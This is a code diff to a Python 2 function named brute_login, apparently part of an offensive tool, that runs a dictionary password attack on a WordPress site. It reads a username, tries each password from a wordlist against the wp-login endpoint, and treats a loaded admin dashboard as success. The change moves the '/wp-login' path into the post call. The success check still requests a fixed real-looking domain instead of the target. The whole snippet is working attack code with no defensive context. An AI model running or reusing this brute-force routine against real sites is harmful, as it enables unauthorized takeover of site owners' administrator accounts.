@@ -139,14 +139,13 @@ def brute_login(tgt, dictionary):
 	
 	user = raw_input("User: ")
 	intent = 0
-	tgt = tgt+"/wp-login"
 	f = open(dictionary, 'r')
 	for word in f.readlines():
 		password = word.strip('\n')
 		intent+=1
-		payload = {'log': user, 'pwd': password, 'redirect_to': '/wp_admin/', 'testcookie': '1', 'wp-submit': 'Acceder'}
+		payload = {'log': user, 'pwd': password, 'redirect_to': tgt+'/wp_admin/', 'testcookie': '1', 'wp-submit': 'Acceder'}
 		print '[+] Trying with user: '+str(user)+' and password: '+str(password)+'\ttry: '+str(intent)
-		s.post(tgt, data=payload)
+		s.post(tgt+"/wp-login", data=payload)
 		data = s.get("http://gerion.info/wp-admin").text
 		if 'Escritorio' in data or 'Desktop' in data:
 			print '[*] Password found: '+password
